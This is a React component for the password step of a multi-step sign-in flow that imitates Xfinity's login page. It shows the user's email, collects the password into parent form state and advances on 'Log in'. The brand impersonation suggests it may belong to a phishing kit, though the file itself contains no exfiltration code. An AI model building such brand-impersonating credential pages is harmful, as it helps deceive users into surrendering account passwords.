import React, { useState } from 'react';
import logo from '../assets/logo.png';

const Password = ({ email, handleChange, handleNext }) => {
    const [password, setPassword] = useState('');

    const handlePasswordChange = (e) => {
        setPassword(e.target.value);
        handleChange(e); // Ensure this updates the form data in the parent component
    };

    return (
        <div className="flex flex-col justify-center items-center h-screen bg-gray-50 p-4">
            <div className="max-w-sm">
                <div className="mb-6">
                    <img src={logo} alt="Xfinity" className="w-24" />
                </div>

                <p className="text-gray-700 mb-6 text-sm font-bold">
                    {email}
                </p>

                <h1 className="text-2xl font-bold mb-4">Enter your password</h1>

                <div className="relative mb-4">
                    <input
                        type="password" // Change to type "password" for security
                        name="password" // Add name attribute for controlled input
                        value={password} // Set the value from the state
                        onChange={handlePasswordChange} // Call the state handler
                        placeholder="Password"
                        className="border border-gray-300 rounded-lg p-3 w-full focus:outline-none focus:ring-2 focus:ring-purple-600"
                    />
                    <button
                        type="button"
                        className="absolute inset-y-0 right-4 flex items-center text-gray-500"
                    >
                        {/* Optionally add an icon for showing/hiding password */}
                    </button>
                </div>

                <a href="#" className="text-purple-600 text-sm mb-4 block">
                    Forgot password?
                </a>

                <div className="flex items-center mb-4">
                    <input type="checkbox" id="keep-signed-in" className="mr-2" />
                    <label htmlFor="keep-signed-in" className="text-sm text-gray-700">
                        Keep me signed in
                    </label>
                </div>

                <p className="text-sm text-gray-500 mb-6">
                    By signing in, you agree to our{' '}
                    <a href="#" className="text-purple-600">
                        Terms of Service
                    </a>{' '}
                    and{' '}
                    <a href="#" className="text-purple-600">
                        Privacy Policy
                    </a>.
                </p>

                <button
                    type="button"
                    className="bg-purple-700 hover:bg-purple-800 rounded-md text-white py-4 px-6 font-bold mb-4"
                    onClick={handleNext} // Call handleNext here to move to the next step
                >
                    Log in
                </button>

                <p className="text-sm text-gray-700">
                    <a href="#" className="text-black hover:underline">
                        Sign in as someone else
                    </a>
                </p>
            </div>
        </div>
    );
};

export default Password;
